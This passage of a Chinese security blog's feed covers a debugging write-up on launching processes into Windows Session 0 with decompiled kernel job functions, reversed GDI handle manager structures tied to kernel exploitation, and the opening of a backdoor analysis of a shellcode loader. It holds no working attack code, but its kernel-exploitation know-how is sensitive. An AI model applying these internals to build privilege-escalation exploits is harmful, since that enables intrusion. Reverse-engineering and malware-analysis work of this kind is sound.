&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/Pasted%20image%2020221221131754.png&quot; alt=&quot;Pasted image 20221221131754.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;纪念一下自己的第一个提权 exp。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;本以为在分析完漏洞后编写利用应该是很快很轻松的事，却没想到过程居然如此坎坷。并且即便是分析了漏洞的成因、编写了漏洞的 exp，对于如何挖掘这个漏洞，我觉得仍然离我十分遥远。同时在利用上，提权只是开始，能做到从 ring3 直接打到内核才应该是终极目标。&lt;/p&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">在有了一些漏洞利用知识后，回过头来再看这个洞。在这个洞中，攻击者可以通过在 HMAssignmentUnlock 中提前释放 SBTrack 来达到 double free 的效果，那么如何利用这个漏洞呢？</summary></entry><entry><title type="html">Job, Session, and CreateProcessAsUser</title><link href="https://citrusice.github.io/posts/job-session-and-createprocessasuser/" rel="alternate" type="text/html" title="Job, Session, and CreateProcessAsUser" /><published>2022-12-23T15:05:27+08:00</published><updated>2022-12-23T15:05:27+08:00</updated><id>https://citrusice.github.io/posts/job-session-and-createprocessasuser</id><content type="html" xml:base="https://citrusice.github.io/posts/job-session-and-createprocessasuser/">&lt;p&gt;起因是因为要实现一个在 Session0 启动进程的功能（注意是在 Session0 启动，不是从 Session0 启动），本以为没什么难度，却没想到还是踩坑了。&lt;/p&gt;

&lt;p&gt;流程很简单：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;获取一个 session0 的 token（应该也可以设置 token 为 session0，但我是从别的进程获取的）&lt;/li&gt;
  &lt;li&gt;Impersonate&lt;/li&gt;
  &lt;li&gt;CreateProcessAsUser&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;结果给的报错是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACCESS_DENIED&lt;/code&gt; (5)。在确认了不是权限的问题之后，我发现这个问题并不简单。如果要想知道到底是什么引起了错误，最直接也是最有效的办法就是操起调试器开始调。于是我打开内核调试，拿起 windbg 在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtCreateUserProcess&lt;/code&gt; 下断。&lt;/p&gt;

&lt;p&gt;经过几轮 trace，最终得到了设置错误的位置，以下是调用栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 ffffa287`2443bc58 fffff800`7da0f8bd     nt!PspConvertJobToMixed
01 ffffa287`2443bc60 fffff800`7d86d16b     nt!PspBindProcessSessionToJob+0x1a22e5
02 ffffa287`2443bc90 fffff800`7d86dadc     nt!PspEstablishJobHierarchy+0x47
03 ffffa287`2443bd00 fffff800`7d82c118     nt!PspImplicitAssignProcessToJob+0x10c
04 ffffa287`2443bd40 fffff800`7d829725     nt!PspInsertProcess+0x7c
05 ffffa287`2443bdc0 fffff800`7d61cbb5     nt!NtCreateUserProcess+0xd85
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过符号名可以看出来是个 job 有关，google 了一下这几个函数也没找到其他人对这几个函数的分析，看来只能自己动手逆一下了。&lt;/p&gt;

&lt;p&gt;要搞清楚函数是要干什么的，主要是要搞清楚什么东西输入了这个函数（参数、全局变量），然后这个函数做了什么。trace 出的这个调用链有点长，不太好梳理，找了一下函数的引用，发现了这样一条调用路径 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtSetInformationJobObject -&amp;gt; PspBindProcessSessionToJob -&amp;gt; PspConvertJobToMixed&lt;/code&gt; ，接着通过 NtSetInformationJobObject 的 signature 很快就逆出来传入 PspBindProcessSessionToJob 的参数是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EJOB&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EPROCESS&lt;/code&gt;， &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PspConvertJobToMixed&lt;/code&gt; 的参数是 EJOB 和 0，再修改修改变量名逻辑就很清晰了。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PspBindProcessSessionToJob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PEJOB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PEPROCESS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;PEJOB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sessionid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// er9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job_SessionId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// er10&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;sessionid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MmGetSessionId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job_SessionId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sessionid&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job_SessionId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_InterlockedCompareExchange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;job_1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SessionId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sessionid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sessionid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PspConvertJobToMixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;job_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PspConvertJobToMixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PEJOB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SessionId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;jobFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JobFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_bittest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1Eu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PartitionObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFFFFFFFFFFFEu&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;job&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SessionId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000022&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大概逻辑就是首先找到新创建进程所属的 session，如果所属的 session 跟 job 的 session 不一致，则调用 PspConvertJobToMixed 将 job 转换为混合 session 的 job。在 PspConvertJobToMixed 中，检查 job 的 JobFlags，要求没有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JOB_OBJECT_LIMIT_AFFINITY&lt;/code&gt; (0x10) 并且第 30 位为 1（不知道是啥），要么  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(((unsigned __int64) job-&amp;gt;PartitionObject + 1) &amp;amp; 0xFFFFFFFFFFFFFFFEui64) != 0&lt;/code&gt;，我也不知道是什么。&lt;/p&gt;

&lt;p&gt;根据逻辑可以看出，当 job 的 session id 为 -2 时，代表这个 job 是跨 session 的，而要想让这个 job 跨 session 那么就需要 job 满足一些条件。同时我们还知道，处于 job 下的进程创建的子进程会被自动继承父进程的 job，这导致内核会试图将子进程加入父进程的 job 中，由于我是在 session1 往 session0 创建进程，而 session1 的进程所属的 job 不满足这个条件，这导致内核无法将 job 转换为 mix job，因此导致创建进程失败。&lt;/p&gt;

&lt;p&gt;那么父进程为什么会有个 job 呢？简单看了一下，我的程序是一个 cui 程序，启动的时候会启动一个 conhost，我发现所有带 conhost 的进程都会有个 job 附加（cmd、powershell 等），看来这个 job 似乎跟 conhost 有关，具体我没有深究了，主要也没搜索到什么信息，如果有了解的欢迎联系我交流！&lt;/p&gt;

&lt;p&gt;解决：只要在创建进程的时候让子进程摆脱父进程的 job 就可以成功创建进程了。这需要在创建进程时传入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CREATE_BREAKAWAY_FROM_JOB&lt;/code&gt; 并且该 job 具有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JOB_OBJECT_LIMIT_BREAKAWAY_OK&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK&lt;/code&gt; 的 flag（发现 job 是有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JOB_OBJECT_LIMIT_BREAKAWAY_OK&lt;/code&gt; flag 的）。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;最近有尝试在用 vscode+cmake 构建工程，调试的话主要是靠 windbg，有时候会用到 cdb，毕竟直接在命令行里调也还是蛮方便的（gdb 或者 lldb 感觉都不太好用，windows 上还是得用 windows 的东西）。相比于 gui 的 windbg 把任何能展示的都直接展示出来，用 cdb 的时候往往需要去认真的想“我想要什么样的信息才能解决这个问题”，因为每个信息都需要靠命令敲出来，无形中增加了成本。但我觉得“知道自己想要什么”是一种很重要的能力。&lt;/p&gt;</content><author><name></name></author><category term="调试" /><category term="windows" /><summary type="html">起因是因为要实现一个在 Session0 启动进程的功能（注意是在 Session0 启动，不是从 Session0 启动），本以为没什么难度，却没想到还是踩坑了。</summary></entry><entry><title type="html">GDI Handle Manager</title><link href="https://citrusice.github.io/posts/gdi-handle-manager/" rel="alternate" type="text/html" title="GDI Handle Manager" /><published>2022-11-23T20:40:29+08:00</published><updated>2022-11-23T20:40:29+08:00</updated><id>https://citrusice.github.io/posts/gdi-handle-manager</id><content type="html" xml:base="https://citrusice.github.io/posts/gdi-handle-manager/">&lt;p&gt;Windows 10 rs1 1607 Anniversary Update 后，微软针对 gdi abuse 实施了缓解措施，让 gdicell 结构体无法在泄露 kernel address，同时 gdi handle manager 也有了一系列更新。&lt;/p&gt;

&lt;p&gt;首先有了新的全局变量 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;win32kbase!gpHandleManager&lt;/code&gt;，由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GdiHandleManager::Create&lt;/code&gt; 创建&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 HandleManager   struc ; (sizeof=0x20, mappedto_28)
00000000 field_0         dd ?
00000004 field_4         dd ?
00000008 MaxHandleCount  dd ?
0000000C field_C         dd ?
00000010 HandleEntryDirectory dq ?
00000018 field_18        dq ?
00000020 HandleManager   ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;HandleEntryDirectory 是个 0x810 大小的表，其中包含了 256 个指向 EntryTable 的指针&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 HandleEntryDirectory struc ; (sizeof=0x810, mappedto_29)
00000000 header          dq ?
00000008 EntryTableArray dq 256 dup(?)
00000808 MaxHandle       dq ?
00000810 HandleEntryDirectory ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;HandleEntryTable 是个动态大小的结构，其 header 为 0x20 大小，整体大小为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x18*MaxHandleCount+0x20&lt;/code&gt;。TableContentPtr 指向 Table 的 content 部分。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 HandleEntryTable struc ; (sizeof=0x20, mappedto_30)
00000000 TableContentPtr dq ?
00000008 MaxHandleCount  dd ?
0000000C field_C         dd ?
00000010 field_10        dq ?
00000018 LookupTable     dq ?
00000020 HandleEntryTable ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 header 的 0x18 位置还有一个指向 lookup table 的指针，lookup table 为如下结构&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 HandleLookupTable struc ; (sizeof=0x10, mappedto_31)
00000000 TableContentPtr dq ?
00000008 MaxHandleCount  dq ?
00000010 HandleLookupTable ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;整个 lookup table 的大小为 ` size = 0x10 + (8 * ((unsigned __int64)(unsigned int)(handle_num + 0xFF) » 8))`，0x10 为 header 大小。&lt;/p&gt;

&lt;p&gt;lookuptable 的内容没逆出来，不知道从哪入手，参考了一下别人的最终搞明白了。每个 lookup table 中的 entry 是一个指针，指向一个数组，数组中存的是真正的 LOOKUP_ENTRY，第一个字段是个锁，第二个字段就是真正的 gdi object 地址&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LookupEntryAddress&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
 &lt;span class=&quot;n&quot;&gt;LOOKUP_ENTRY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaddress&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

 &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LOOKUP_ENTRY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
 &lt;span class=&quot;n&quot;&gt;DWORD64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
 &lt;span class=&quot;n&quot;&gt;PVOID64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GdiObjectAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
 &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Reference：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://cvr-data.blogspot.com/2016/11/windows-10-anniversary-update-gdi.html&quot;&gt;Center of Vulnerability Research: Windows 10 Anniversary Update: GDI handle management and vulnerabilities exploitation&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="windows" /><category term="re" /><category term="pwn" /><summary type="html">Windows 10 rs1 1607 Anniversary Update 后，微软针对 gdi abuse 实施了缓解措施，让 gdicell 结构体无法在泄露 kernel address，同时 gdi handle manager 也有了一系列更新。</summary></entry><entry><title type="html">ByPassAVTeam ShellcodeLoader后门分析</title><link href="https://citrusice.github.io/posts/shellcode-loader-backdoor-analysis/" rel="alternate" type="text/html" title="ByPassAVTeam ShellcodeLoader后门分析" /><published>2022-10-23T13:29:16+08:00</published><updated>2022-10-23T13:29:16+08:00</updated><id>https://citrusice.github.io/posts/shellcode-loader-backdoor-analysis</id><content type="html" xml:base="https://citrusice.github.io/posts/shellcode-loader-backdoor-analysis/">&lt;p&gt;看到有人转发&lt;a href=&quot;https://github.com/ByPassAVTeam/ShellcodeLoader&quot;&gt;这个项目&lt;/a&gt;说带后门，因为很眼熟这个项目，所以下载下来分析一下。&lt;/p&gt;

&lt;p&gt;项目主要部分是个带mfc框架的shellcode loader加上使用冷门函数(PfxInitialize)反沙箱，这种东西只能说躲得过初一躲不过十五。还配了一个自动化配置shellcode的程序，根据别人的消息，后门就在这个自动化配置shellcode的工具里，LoaderMaker.exe。&lt;/p&gt;

&lt;p&gt;另外项目开源的代码是干净的，并没有后门，存在后门的是github项目里发布的预编译程序。&lt;/p&gt;

&lt;p&gt;先看一眼导入表&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221022230914572.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OpenProcess，CreateToolhelp32Snapshot，一股进程注入的味道扑面而来。&lt;/p&gt;

&lt;p&gt;ida粗略看一眼大致流程，其实会发现还是挺正常的，正常的打banner，正常的读文件，正常的写入shellcode，要说有一点点可疑，那也就是那个sedebug提权和anti_sandbox，但是也没见到什么恶意行为。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221022231746749.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么作者是将后门藏在哪里了呢，我第一反应是tls，第二反应是cruntime初始化阶段。但是既然咱们上面已经看到了可以的OpenProcess和CreateToolhelp32Snapshot，就不需要那么麻烦一个一个找了，找到CreateToolhelp32Snapshot，然后看一眼交叉引用，对着代码一顿分析。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221022232245207.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过函数名获取pid，不用多说了吧。&lt;/p&gt;

&lt;p&gt;继续看引用了get_pid的函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221022232341446.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;栈字符串解密-&amp;gt;get_pid-&amp;gt;sub401290，接着看这个sub_401290&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20221023120322393.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

